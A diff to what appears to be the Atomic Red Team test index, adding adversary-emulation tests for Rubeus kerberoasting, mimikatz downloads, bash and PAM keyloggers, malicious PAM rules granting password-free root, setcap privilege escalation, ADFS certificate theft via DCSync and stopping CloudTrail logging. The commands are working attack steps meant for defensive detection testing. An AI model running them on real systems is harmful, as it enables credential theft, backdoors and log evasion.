@@ -240,7 +240,64 @@ credential-access:
       - Dan Nutting, @KerberToast
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1558.004
+    atomic_tests:
+    - name: Rubeus asreproast
+      auto_generated_guid: 615bd568-2859-41b5-9aed-61f6a88e48dd
+      description: |
+        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of Rubeus executable
+          type: Path
+          default: "$Env:temp"
+        local_executable:
+          description: name of the rubeus executable
+          type: String
+          default: rubeus.exe
+        out_file:
+          description: file where command results are stored
+          type: String
+          default: rubeus_output.txt
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      - description: 'Rubeus must exist
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+'
+      executor:
+        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
+
+'
+        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: false
   T1552.003:
     technique:
       external_references:
@@ -1527,7 +1584,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2014,7 +2072,8 @@ credential-access:
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -2363,6 +2422,68 @@ credential-access:
           iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
           Invoke-Kerberoast | fl
         name: powershell
+    - name: Rubeus kerberoast
+      auto_generated_guid: 14625569-6def-4497-99ac-8e7817105b55
+      description: |
+        Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+        This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_folder:
+          description: Local path of Rubeus executable
+          type: Path
+          default: "$Env:temp"
+        local_executable:
+          description: name of the rubeus executable
+          type: String
+          default: rubeus.exe
+        out_file:
+          description: file where command results are stored
+          type: String
+          default: rubeus_output.txt
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        flags:
+          description: command flags you would like to run (optional and blank by
+            default)
+          type: String
+          default: 
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Computer must be domain joined
+
+'
+        prereq_command: 'if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain)
+          {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Write-Host Joining this computer to a domain must be
+          done manually
+
+'
+      - description: 'Rubeus must exist
+
+'
+        prereq_command: 'if(Test-Path -Path #{local_folder}\#{local_executable}) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{local_folder}\#{local_executable}
+
+'
+      executor:
+        command: 'cmd.exe /c "#{local_folder}\#{local_executable}" kerberoast #{flags}
+          /outfile:"#{local_folder}\#{out_file}"
+
+'
+        cleanup_command: 'Remove-Item #{local_folder}\#{out_file} -ErrorAction Ignore
+
+'
+        name: powershell
+        elevation_required: false
   T1555.001:
     technique:
       created: '2020-02-12T18:55:24.728Z'
@@ -2567,6 +2688,148 @@ credential-access:
           sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
         name: sh
         elevation_required: true
+    - name: Logging bash history to syslog
+      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
+      description: "There are several variables that can be set to control the appearance
+        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
+        of these variables are executed as if they had been typed on the command line.
+        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
+        and can be configured to write the latest \"bash history\" entries to the
+        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
+        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell and that logger
+          and tee are installed.
+
+'
+        prereq_command: |
+          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+          tail /var/log/syslog
+        cleanup_command: 'unset PROMPT_COMMAND
+
+'
+    - name: Bash session based keylogger
+      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+      description: "When a command is executed in bash, the BASH_COMMAND variable
+        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
+        The trap command is not a external command, but a built-in function of bash
+        and can be used in a script to run a bash function when some event occurs.
+        trap will detect when the BASH_COMMAND variable value changes and then pipe
+        that value into a file, creating a bash session based keylogger. \n\nTo gain
+        persistence the command could be added to the users .bashrc or .bash_aliases
+        or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell
+
+'
+        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
+          Bash not running! *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          name: output_file
+          description: File to store captured commands
+          type: String
+          default: "/tmp/.keyboard.log"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
+          echo "Hello World!"
+          cat #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
+    - name: SSHD PAM keylogger
+      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
+      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
+        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
+        of TTY input and capture all keystrokes in a ssh session and place them in
+        the /var/log/audit/audit.log file after the session closes.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: |
+          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        user_account:
+          description: Basic ssh user account for testing.
+          type: string
+          default: ubuntu
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
+          disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
+          restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n"
+        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/
+
+'
+    - name: Auditd keylogger
+      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
+      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
+        command execution and place the command in the /var/log/audit/audit.log audit
+        log. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
+          auditd NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          description: description
+          type: type
+          default: default
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
+          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
+          $(date +\"%d/%m/%y %H:%M:%S\") \n"
+        cleanup_command: 'systemctl restart auditd
+
+'
   T1557.001:
     technique:
       external_references:
@@ -3030,15 +3293,8 @@ credential-access:
 '
         get_prereq_command: |
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $url = 'https://github.com/gentilkiwi/mimikatz/releases/latest'
-          $request = [System.Net.WebRequest]::Create($url)
-          $response = $request.GetResponse()
-          $realTagUrl = $response.ResponseUri.OriginalString
-          $version = $realTagUrl.split('/')[-1]
-          $fileName = 'mimikatz_trunk.zip'
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $realDownloadUrl =$realTagUrl.Replace('tag','download') + '/' + $fileName
-          Invoke-WebRequest $realDownloadUrl -OutFile "$env:TEMP\Mimi.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\Mimi.zip"
           Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
@@ -4892,7 +5148,100 @@ credential-access:
       x_mitre_platforms:
       - Linux
       - macOS
-    atomic_tests: []
+      identifier: T1556.003
+    atomic_tests:
+    - name: Malicious PAM rule
+      auto_generated_guid: 4b9dde80-ae22-44b1-a82a-644bf009eb9c
+      description: |
+        Inserts a rule into a PAM config and then tests it.
+
+        Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient pam_succeed_if.so uid >= 0
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
+    - name: Malicious PAM module
+      auto_generated_guid: 65208808-3125-4a2e-8389-a0a00e9ab326
+      description: |
+        Creates a PAM module, inserts a rule to use it, and then tests it.
+
+        Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+      supported_platforms:
+      - linux
+      input_arguments:
+        path_to_pam_conf:
+          description: PAM config file to modify.
+          type: string
+          default: "/etc/pam.d/su-l"
+        pam_rule:
+          description: Rule to add to the PAM config.
+          type: string
+          default: auth sufficient /tmp/pam_evil.so
+        index:
+          description: Index where the rule is inserted.
+          type: integer
+          default: 1
+        path_to_pam_module_source:
+          description: Path to PAM module source code.
+          type: path
+          default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+        path_to_pam_module:
+          description: Path to PAM module object
+          type: path
+          default: "/tmp/pam_evil.so"
+      dependencies:
+      - description: 'The PAM development library must be installed to build the PAM
+          module
+
+'
+        prereq_command: 'if [ -f /usr/include/security/pam_modules.h ]; then exit
+          0; else exit 1; fi;
+
+'
+        get_prereq_command: 'if [ -n "`which apt-get`" ]; then sudo apt-get -y install
+          libpam0g-dev; elif [ -n "`which yum`" ]; then sudo yum -y install pam-devel;
+          fi
+
+'
+      - description: 'The PAM module must exist on disk at specified location (#{path_to_pam_module})
+
+'
+        prereq_command: 'if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1;
+          fi;
+
+'
+        get_prereq_command: 'sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: 'sudo sed -i "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
+
+'
+        cleanup_command: 'sudo sed -i "\,#{pam_rule},d" #{path_to_pam_conf}
+
+'
   T1552.004:
     technique:
       id: attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf
@@ -5072,6 +5421,99 @@ credential-access:
 
 '
         name: sh
+    - name: ADFS token signing and encryption certificates theft - Local
+      auto_generated_guid: 78e95057-d429-4e66-8f82-0f060c1ac96f
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals module must be installed.
+
+'
+        prereq_command: 'if (Get-Module AADInternals) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: |
+          Import-Module AADInternals -Force
+          Export-AADIntADFSCertificates
+          Get-ChildItem | Where-Object {$_ -like "ADFS*"}
+          Write-Host "`nCertificates retrieved successfully"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
+    - name: ADFS token signing and encryption certificates theft - Remote
+      auto_generated_guid: cab413d8-9e4a-4b8d-9b84-c985bd73a442
+      description: |
+        Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.
+        Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.
+      supported_platforms:
+      - windows
+      input_arguments:
+        adfs_service_account_name:
+          description: Name of the ADFS service account
+          type: String
+          default: adfs_svc
+        replication_user:
+          description: Username with replication rights. It can be the Domain Admin
+            running the script
+          type: String
+          default: Administrator
+        replication_password:
+          description: Password of replication_username
+          type: String
+          default: ReallyStrongPassword
+        adfs_server_name:
+          description: Name of an ADFS server
+          type: String
+          default: sts.contoso.com
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'AADInternals and ActiveDirectory modules must be installed.
+
+'
+        prereq_command: 'if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable
+          -Name ActiveDirectory)) {echo 0} else {echo 1}
+
+'
+        get_prereq_command: 'Install-Module -Name AADInternals -Force
+
+'
+      executor:
+        command: "Import-Module ActiveDirectory -Force \nImport-Module AADInternals
+          -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc
+          = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object
+          name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString
+          -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object
+          -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user},
+          $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash
+          = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential
+          -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration
+          -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get
+          certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group =
+          $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent
+          = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base
+          = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter
+          = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\")
+          | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"]
+          \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\")
+          | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne()
+          \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted
+          certificates from configuration and decrypt them\nExport-AADIntADFSCertificates
+          -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like
+          \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n"
+        cleanup_command: |
+          Remove-Item -Path ".\ADFS_encryption.pfx"
+          Remove-Item -Path ".\ADFS_signing.pfx"
+        name: powershell
   T1003.007:
     technique:
       external_references:
@@ -8118,6 +8560,148 @@ collection:
           sudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth
         name: sh
         elevation_required: true
+    - name: Logging bash history to syslog
+      auto_generated_guid: 0e59d59d-3265-4d35-bebd-bf5c1ec40db5
+      description: "There are several variables that can be set to control the appearance
+        of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents
+        of these variables are executed as if they had been typed on the command line.
+        The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable
+        and can be configured to write the latest \"bash history\" entries to the
+        syslog.\n\nTo gain persistence the command could be added to the users .bashrc
+        or .bash_aliases or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell and that logger
+          and tee are installed.
+
+'
+        prereq_command: |
+          if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
+          if [ ! -x "$(command -v logger)" ]; then echo -e "\n***** logger NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v tee)" ]; then echo -e "\n***** tee NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: sh
+        elevation_required: true
+        command: |
+          PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t "$USER[$$] $SSH_CONNECTION ")'
+          echo "\$PROMPT_COMMAND=$PROMPT_COMMAND"
+          tail /var/log/syslog
+        cleanup_command: 'unset PROMPT_COMMAND
+
+'
+    - name: Bash session based keylogger
+      auto_generated_guid: 7f85a946-a0ea-48aa-b6ac-8ff539278258
+      description: "When a command is executed in bash, the BASH_COMMAND variable
+        contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\".
+        The trap command is not a external command, but a built-in function of bash
+        and can be used in a script to run a bash function when some event occurs.
+        trap will detect when the BASH_COMMAND variable value changes and then pipe
+        that value into a file, creating a bash session based keylogger. \n\nTo gain
+        persistence the command could be added to the users .bashrc or .bash_aliases
+        or the systems default .bashrc in /etc/skel/ \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires to be run in a bash shell
+
+'
+        prereq_command: 'if [ "$(echo $SHELL)" != "/bin/bash" ]; then echo -e "\n*****
+          Bash not running! *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          name: output_file
+          description: File to store captured commands
+          type: String
+          default: "/tmp/.keyboard.log"
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
+          echo "Hello World!"
+          cat #{output_file}
+        cleanup_command: 'rm #{output_file}
+
+'
+    - name: SSHD PAM keylogger
+      auto_generated_guid: 81d7d2ad-d644-4b6a-bea7-28ffe43becca
+      description: 'Linux PAM (Pluggable Authentication Modules) is used in sshd authentication.
+        The Linux audit tool auditd can use the pam_tty_audit module to enable auditing
+        of TTY input and capture all keystrokes in a ssh session and place them in
+        the /var/log/audit/audit.log file after the session closes.
+
+'
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: |
+          if [ ! -x "$(command -v sshd)" ]; then echo -e "\n***** sshd NOT installed *****\n"; exit 1; fi
+          if [ ! -x "$(command -v auditd)" ]; then echo -e "\n***** auditd NOT installed *****\n"; exit 1; fi
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        user_account:
+          description: Basic ssh user account for testing.
+          type: string
+          default: ubuntu
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "cp -v /etc/pam.d/sshd /tmp/\necho >> \"session required pam_tty_audit.so
+          disable=* enable=* open_only log_passwd\"\nsystemctl restart sshd\nsystemctl
+          restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n"
+        cleanup_command: 'cp -fv /tmp/sshd /etc/pam.d/
+
+'
+    - name: Auditd keylogger
+      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
+      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
+        command execution and place the command in the /var/log/audit/audit.log audit
+        log. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
+          auditd NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      input_arguments:
+        output_file:
+          description: description
+          type: type
+          default: default
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
+          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
+          $(date +\"%d/%m/%y %H:%M:%S\") \n"
+        cleanup_command: 'systemctl restart auditd
+
+'
   T1557.001:
     technique:
       external_references:
@@ -8920,6 +9504,31 @@ collection:
         cleanup_command: 'rm #{output_file} -ErrorAction Ignore
 
 '
+    - name: Windows Screen Capture (CopyFromScreen)
+      auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
+      description: |
+        Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
+
+        [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "$env:TEMP\\T1113.png"
+      executor:
+        command: |
+          Add-Type -AssemblyName System.Windows.Forms
+          $screen = [Windows.Forms.SystemInformation]::VirtualScreen
+          $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+          $graphic = [Drawing.Graphics]::FromImage($bitmap)
+          $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+          $bitmap.Save("#{output_file}")
+        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore
+
+'
+        name: powershell
   T1213.002:
     technique:
       external_references:
@@ -15689,7 +16298,8 @@ privilege-escalation:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -17118,6 +17728,52 @@ privilege-escalation:
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
+        name: sh
+        elevation_required: true
+    - name: Make and modify capabilities of a binary
+      auto_generated_guid: db53959c-207d-4000-9e7a-cd8eb417e072
+      description: |
+        Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.
+        The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.
+        Without being owned by root, the binary can set the UID to 0.
+      supported_platforms:
+      - linux
+      input_arguments:
+        payload:
+          description: cap.c payload
+          type: path
+          default: PathToAtomicsFolder/T1548.001/src/cap.c
+      executor:
+        command: |
+          cp #{payload} /tmp/cap.c
+          make /tmp/cap
+          sudo setcap cap_setuid=ep /tmp/cap
+          /tmp/cap
+        cleanup_command: |
+          rm /tmp/cap
+          rm /tmp/cap.c
+        name: sh
+        elevation_required: true
+    - name: Provide the SetUID capability to a file
+      auto_generated_guid: 1ac3272f-9bcf-443a-9888-4b1d3de785c1
+      description: 'This test gives a file the capability to set UID without using
+        flags.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        file_to_setcap:
+          description: Path of file to provide the SetUID capability
+          type: path
+          default: "/tmp/evilBinary"
+      executor:
+        command: |
+          touch #{file_to_setcap}
+          sudo setcap cap_setuid=ep #{file_to_setcap}
+        cleanup_command: 'rm #{file_to_setcap}
 
 '
         name: sh
@@ -22565,7 +23221,50 @@ defense-evasion:
       - Matt Snyder, VMware
       x_mitre_platforms:
       - IaaS
-    atomic_tests: []
+      identifier: T1562.008
+    atomic_tests:
+    - name: AWS CloudTrail Changes
+      auto_generated_guid: 9c10dc6b-20bd-403a-8e67-50ef7d07ed4e
+      description: 'Creates a new cloudTrail in AWS, Upon successful creation it will
+        Update,Stop and Delete the cloudTrail
+
+'
+      supported_platforms:
+      - iaas:aws
+      input_arguments:
+        cloudtrail_name:
+          description: Name of the cloudTrail
+          type: String
+          default: redatomictesttrail
+        s3_bucket_name:
+          description: Name of the bucket
+          type: String
+          default: redatomic-test
+        region:
+          description: Name of the region
+          type: String
+          default: us-east-1
+      dependencies:
+      - description: 'Check if ~/.aws/credentials file has a default stanza is configured
+
+'
+        prereq_command: |
+          cat ~/.aws/credentials | grep "default"
+          aws s3api create-bucket --bucket #{s3_bucket_name} --region #{region}
+          aws s3api put-bucket-policy --bucket #{s3_bucket_name} --policy file://$PathToAtomicsFolder/T1562.008/src/policy.json
+        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
+          defult profile using: aws configure
+
+'
+      executor:
+        command: |
+          aws cloudtrail create-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name} --region #{region}
+          aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}
+          aws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}
+          aws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}
+        cleanup_command: "aws s3 rb s3://#{s3_bucket_name} --force \n"
+        name: sh
